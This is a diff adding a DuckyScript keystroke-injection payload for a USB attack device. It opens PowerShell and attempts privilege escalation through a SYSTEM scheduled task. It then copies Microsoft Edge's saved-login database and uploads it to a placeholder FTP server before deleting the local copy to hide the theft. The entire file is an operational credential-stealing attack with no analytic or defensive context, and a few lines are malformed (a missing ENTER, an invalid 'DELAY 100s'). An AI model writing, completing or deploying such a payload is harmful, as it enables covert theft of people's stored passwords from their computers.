@@ -1,0 +1,41 @@
+DELAY 1500
+CTRL ESC
+DELAY 500
+STRING powershell
+ENTER
+DELAY 800
+STRING schtasks /create /tn "ElevatePrivileges" /tr "powershell Start-Process -FilePath 'powershell' -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command Start-Process PowerShell -Verb RunAs'" /sc once /st 00:00 /ru system
+ENTER
+STRING schtasks /run /tn "ElevatePrivileges"
+ENTER
+DELAY 5000
+STRING $username = $env:USERNAME
+ENTER
+STRING $edgeDbPath = "C:\Users\$username\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
+ENTER
+STRING $workingDir = "C:\temp"
+ENTER
+STRING New-Item -Path $workingDir -ItemType Directory -Force
+ENTER
+STRING Copy-Item -Path $edgeDbPath -Destination "$workingDir\LoginData"
+DELAY 100
+STRING $ftp = "ftp://ftp-server-address/"
+ENTER
+STRING $file = "$workingDir\LoginData"
+ENTER
+STRING $ftpUsername = "ftp-username"
+ENTER
+STRING $ftpPassword = "ftp-password"
+ENTER
+STRING $webclient = New-Object System.Net.WebClient
+ENTER
+STRING $webclient.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
+ENTER
+STRING $uri = New-Object System.Uri($ftp + (Get-Item $file).Name)
+ENTER
+STRING $webclient.UploadFile($uri, $file)
+ENTER
+STRING Remove-Item -Path "$workingDir\LoginData"
+DELAY 100s
+STRING Exit
+ENTER
